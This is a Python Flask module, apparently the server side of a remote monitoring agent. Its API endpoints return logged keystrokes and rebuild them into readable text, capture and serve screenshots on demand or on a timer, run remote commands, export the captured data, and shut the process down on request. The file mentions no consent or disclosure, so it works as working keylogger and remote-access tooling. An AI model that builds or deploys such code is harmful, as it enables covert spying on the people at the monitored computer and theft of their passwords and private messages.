import os
import base64
import time
import signal
from datetime import datetime
from threading import Thread
from flask import request, jsonify

from .monitoring import (
    start_monitoring, stop_monitoring, get_monitoring_status,
    get_events, get_keystrokes, log_event
)
from .screenshots import (
    take_screenshot, get_screenshot_history, get_latest_screenshot,
    set_auto_screenshot
)
from .remote_commands import execute_remote_command
from .config import SCREENSHOTS_DIR, CONFIG_FILE

def require_auth(api_key):
    """Authentication decorator factory"""
    def decorator(f):
        def decorated(*args, **kwargs):
            request_key = request.headers.get('X-API-Key')
            if request_key != api_key:
                return jsonify({"error": "Unauthorized"}), 401
            return f(*args, **kwargs)
        decorated.__name__ = f.__name__
        return decorated
    return decorator

def setup_routes(app, config):
    """Setup all Flask routes"""
    API_KEY = config['api_key']
    pc_id = config['pc_id']
    
    auth = require_auth(API_KEY)
    
    @app.route('/api/status', methods=['GET'])
    def status():
        """Get current monitoring status"""
        return jsonify({
            "monitoring": get_monitoring_status(),
            "event_count": len(get_events()),
            "keystroke_count": len(get_keystrokes()),
            "screenshot_count": len(get_screenshot_history()),
            "pc_id": pc_id,
            "pc_name": config.get('pc_name', 'Unknown'),
            "auto_screenshot": config.get('auto_screenshot', False),
            "offline_mode": False
        })
    
    @app.route('/api/start', methods=['POST'])
    @auth
    def start():
        """Start monitoring"""
        result = start_monitoring(pc_id)
        return jsonify(result)
    
    @app.route('/api/stop', methods=['POST'])
    @auth
    def stop():
        """Stop monitoring"""
        result = stop_monitoring(pc_id)
        return jsonify(result)
    
    @app.route('/api/kill', methods=['POST'])
    @auth
    def kill_server():
        """Kill the server process"""
        log_event("server_killed", {"source": "remote_client"}, pc_id)
        stop_monitoring(pc_id)
        
        response = jsonify({"status": "server_killed", "message": "Server shutting down..."})
        
        def shutdown():
            time.sleep(1)
            print("\n[!] Server killed by remote client")
            os.kill(os.getpid(), signal.SIGTERM)
        
        Thread(target=shutdown, daemon=True).start()
        return response
    
    @app.route('/api/events', methods=['GET'])
    @auth
    def get_events_api():
        """Get logged events"""
        limit = int(request.args.get('limit', 100))
        event_type = request.args.get('type', None)
        search = request.args.get('search', None)
        
        filtered = get_events()
        
        if event_type:
            filtered = [e for e in filtered if e['type'] == event_type]
        
        if search:
            search_lower = search.lower()
            filtered = [e for e in filtered if 
                       search_lower in str(e.get('details', {})).lower() or
                       search_lower in e['type'].lower()]
        
        return jsonify(filtered[-limit:])
    
    @app.route('/api/keystrokes/buffer', methods=['GET'])
    @auth
    def get_keystroke_buffer():
        """Get buffered keystrokes"""
        limit = int(request.args.get('limit', 1000))
        format_as_text = request.args.get('format', 'json') == 'text'
        
        buffer = get_keystrokes()[-limit:]
        
        if format_as_text:
            text = ""
            for ks in buffer:
                key = ks['key']
                if key.startswith('Key.'):
                    key_name = key.replace('Key.', '')
                    if key_name == 'space':
                        text += ' '
                    elif key_name == 'enter':
                        text += '\n'
                    elif key_name == 'tab':
                        text += '\t'
                else:
                    text += key
            return jsonify({"text": text, "count": len(buffer)})
        else:
            return jsonify(buffer)
    
    @app.route('/api/snapshot', methods=['POST'])
    @auth
    def snapshot():
        """Take an immediate screenshot"""
        filepath = take_screenshot()
        if filepath:
            log_event("screenshot", {"filename": filepath.name}, pc_id)
            return jsonify({"status": "success", "filename": filepath.name})
        return jsonify({"error": "Failed to capture screenshot"}), 500
    
    @app.route('/api/screenshot/latest', methods=['GET'])
    @auth
    def get_latest_screenshot_api():
        """Get the most recent screenshot"""
        latest = get_latest_screenshot()
        if not latest:
            return jsonify({"error": "No screenshots available"}), 404
        
        try:
            with open(latest['path'], 'rb') as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            return jsonify({
                "image": image_data,
                "timestamp": latest['timestamp'],
                "filename": latest['filename']
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    
    @app.route('/api/screenshot/history', methods=['GET'])
    @auth
    def get_screenshot_history_api():
        """Get screenshot history list"""
        return jsonify(get_screenshot_history())
    
    @app.route('/api/screenshot/<filename>', methods=['GET'])
    @auth
    def get_screenshot(filename):
        """Get specific screenshot by filename"""
        filepath = SCREENSHOTS_DIR / filename
        
        if not filepath.exists():
            return jsonify({"error": "Screenshot not found"}), 404
        
        try:
            with open(filepath, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            return jsonify({"image": image_data, "filename": filename})
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    
    @app.route('/api/settings/screenshot', methods=['POST'])
    @auth
    def update_screenshot_settings():
        """Update automatic screenshot settings"""
        data = request.json or {}
        
        if 'enabled' in data:
            config['auto_screenshot'] = data['enabled']
        
        if 'interval' in data:
            config['screenshot_interval'] = int(data['interval'])
        
        set_auto_screenshot(
            config['auto_screenshot'],
            config.get('screenshot_interval', 300)
        )
        
        import json
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        
        return jsonify({
            "enabled": config['auto_screenshot'],
            "interval": config.get('screenshot_interval', 300)
        })
    
    @app.route('/api/command', methods=['POST'])
    @auth
    def execute_command():
        """Execute remote command"""
        data = request.json or {}
        result = execute_remote_command(data, pc_id, log_event)
        
        if isinstance(result, tuple):
            return jsonify(result[0]), result[1]
        return jsonify(result)
    
    @app.route('/api/export', methods=['GET'])
    @auth
    def export_data():
        """Export all data"""
        export_type = request.args.get('type', 'events')
        
        if export_type == 'events':
            data = get_events()
        elif export_type == 'keystrokes':
            data = get_keystrokes()
        else:
            return jsonify({"error": "Invalid export type"}), 400
        
        return jsonify(data)